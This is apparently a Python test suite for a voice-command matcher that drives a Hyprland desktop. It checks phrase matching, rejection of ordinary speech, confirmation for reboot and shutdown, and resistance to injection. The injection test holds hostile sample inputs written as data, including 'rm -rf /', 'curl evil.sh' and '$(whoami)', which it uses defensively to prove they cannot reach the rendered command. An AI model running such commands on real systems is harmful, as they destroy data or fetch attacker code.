#!/usr/bin/env python3
"""Tests for the utter grammar and matcher.

Run: python3 tests/test_grammar.py

The matcher is the only part of Utter that decides whether something runs, so
this is where the safety guarantees are pinned down: no false positives on
ordinary speech, no argument injection through slots, and destructive commands
gated behind a confirm.
"""

import importlib.machinery
import importlib.util
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "bin"))

# bin/utter has no .py suffix, so point the loader at it explicitly.
_loader = importlib.machinery.SourceFileLoader("utter", str(ROOT / "bin" / "utter"))
_spec = importlib.util.spec_from_loader("utter", _loader)
utter = importlib.util.module_from_spec(_spec)
_loader.exec_module(utter)

GRAMMAR = json.loads((ROOT / "default" / "commands.json").read_text())
M = utter.Matcher(GRAMMAR)

PASSED = 0
FAILED = []


def check(name, condition, detail=""):
    global PASSED
    if condition:
        PASSED += 1
    else:
        FAILED.append(f"{name}{(': ' + detail) if detail else ''}")


def match(text, threshold=0.80):
    hit, _cleaned = M.match(text, threshold)
    return hit


def expect(text, command_id, run=None):
    hit = match(text)
    if hit is None:
        check(f"{text!r} -> {command_id}", False, "no match")
        return
    check(f"{text!r} -> {command_id}", hit.cmd["id"] == command_id,
          f"got {hit.cmd['id']}")
    if run is not None:
        check(f"{text!r} runs {run!r}", hit.rendered == run, f"got {hit.rendered!r}")


def expect_none(text):
    hit = match(text)
    check(f"{text!r} -> no match", hit is None,
          f"matched {hit.cmd['id']} ({hit.score:.2f})" if hit else "")


# ---- exact phrases across every group ------------------------------------

expect("focus left", "focus.move", "hyprctl dispatch movefocus l")
expect("focus right", "focus.move", "hyprctl dispatch movefocus r")
expect("go up", "focus.move", "hyprctl dispatch movefocus u")
expect("move window down", "window.move", "hyprctl dispatch movewindow d")
expect("close window", "window.close", "hyprctl dispatch killactive")
expect("full screen", "window.fullscreen")
expect("float this", "window.float")
expect("center this", "window.center")
expect("pin it", "window.pin")
expect("workspace 3", "workspace.go", "hyprctl dispatch workspace 3")
expect("workspace three", "workspace.go", "hyprctl dispatch workspace 3")
expect("go to workspace 9", "workspace.go", "hyprctl dispatch workspace 9")
expect("next workspace", "workspace.next")
expect("previous workspace", "workspace.prev")
expect("throw this to 5", "workspace.throw", "hyprctl dispatch movetoworkspace 5")
expect("open the browser", "app.launch", "omarchy launch browser")
expect("launch terminal", "app.launch", "omarchy launch terminal")
expect("show clipboard", "clipboard.open")
expect("volume up", "volume.up")
expect("mute the microphone", "mic.mute")
expect("brighter", "brightness.up")
expect("night light", "nightlight.toggle")
expect("do not disturb", "dnd.toggle")
expect("take a screenshot", "capture.region")
expect("lock the screen", "session.lock", "omarchy system lock")
expect("reboot", "session.reboot")

# ---- homophones whisper genuinely produces -------------------------------

expect("workspace to", "workspace.go", "hyprctl dispatch workspace 2")
expect("workspace for", "workspace.go", "hyprctl dispatch workspace 4")
expect("workspace ate", "workspace.go", "hyprctl dispatch workspace 8")
expect("workspace won", "workspace.go", "hyprctl dispatch workspace 1")

# ---- transcription noise: punctuation, case, fillers, wake words ----------

expect("Focus left.", "focus.move")
expect("FOCUS LEFT", "focus.move")
expect("  focus   left  ", "focus.move")
expect("um, please close window", "window.close")
expect("can you lock the screen", "session.lock")
expect("omarchy focus right", "focus.move")
expect("computer workspace 4", "workspace.go")
expect("hey omarchy next workspace", "workspace.next")

# ---- mishearings within tolerance ----------------------------------------

expect("focus lefd", "focus.move")
expect("close the windo", "window.close")
expect("vollume up", "volume.up")
expect("next workspase", "workspace.next")
expect("full-screen", "window.fullscreen")

# ---- the safety property: ordinary speech must not trigger anything -------
# This corpus is the kind of thing a hot mic picks up. Every one must be
# rejected, because a false positive here closes someone's window.

for phrase in [
    "banana pancakes",
    "i was thinking about the report we discussed yesterday",
    "yeah that sounds good to me",
    "hold on let me find the file",
    "the weather is really nice today",
    "so anyway what did you think of it",
    "i need to send that email before lunch",
    "did you get a chance to look at the pull request",
    "one two three testing",
    "hello",
    "",
    "   ",
    "thanks",
]:
    expect_none(phrase)

# ---- destructive commands are gated --------------------------------------

for cid in ["session.reboot", "session.shutdown", "session.sleep"]:
    cmd = next(c for c in GRAMMAR["commands"] if c["id"] == cid)
    check(f"{cid} requires confirm", cmd.get("confirm") is True)

# ---- structural integrity -------------------------------------------------

ids = [c["id"] for c in GRAMMAR["commands"]]
check("command ids unique", len(ids) == len(set(ids)),
      f"dupes: {[i for i in ids if ids.count(i) > 1]}")

slots = set(GRAMMAR.get("slots", {}))
for cmd in GRAMMAR["commands"]:
    for template in cmd["say"]:
        for name in utter.Matcher.SLOT_RE.findall(template):
            check(f"{cmd['id']} slot {{{name}}} exists", name in slots)
    for name in utter.Matcher.SLOT_RE.findall(cmd.get("run", "")):
        check(f"{cmd['id']} run slot {{{name}}} exists", name in slots)

check("no command opts into a shell",
      not any(c.get("shell") for c in GRAMMAR["commands"]))

# ---- injection: a slot can only ever be a value from the grammar ----------
# The run line is shlex-split, so the danger would be a slot smuggling extra
# arguments in. Slot values are canonical keys the grammar author wrote, and
# the spoken text is never substituted, so this holds by construction --
# assert it anyway, because it is the whole security model.

for attempt in [
    "workspace 3; rm -rf /",
    "focus left && curl evil.sh",
    "workspace $(whoami)",
    "focus left | tee /tmp/x",
]:
    hit = match(attempt)
    if hit is not None:
        rendered = hit.rendered
        check(f"{attempt!r} cannot inject",
              all(ch not in rendered for ch in [";", "|", "&", "$", "`"]),
              f"rendered {rendered!r}")
    else:
        check(f"{attempt!r} cannot inject", True)

# every slot value that can reach a run line is shell-safe
for slot_name, table in GRAMMAR.get("slots", {}).items():
    for canonical in table:
        check(f"slot {slot_name}={canonical} is safe",
              all(ch not in str(canonical) for ch in [";", "|", "&", "$", "`", " ", "\n"]))

# ---- rendering ------------------------------------------------------------

hit = match("workspace 7")
check("numeric slot labels as a digit", hit and hit.label == "Workspace 7",
      hit.label if hit else "")
hit = match("focus left")
check("word slot labels as a word", hit and hit.label == "Focus left",
      hit.label if hit else "")

# ---- normalization helpers ------------------------------------------------

check("normalize strips punctuation", utter.normalize("Focus, left!") == "focus left")
check("normalize keeps digits", utter.normalize("Workspace 3.") == "workspace 3")
check("drop_fillers keeps meaning", utter.drop_fillers("um close window") == "close window")
check("drop_fillers never empties", utter.drop_fillers("please") == "please")
check("strip_leaders", utter.strip_leaders("can you close window") == "close window")

# ---- report ---------------------------------------------------------------

print(f"\n{PASSED} passed, {len(FAILED)} failed")
for f in FAILED:
    print(f"  FAIL  {f}")
sys.exit(1 if FAILED else 0)
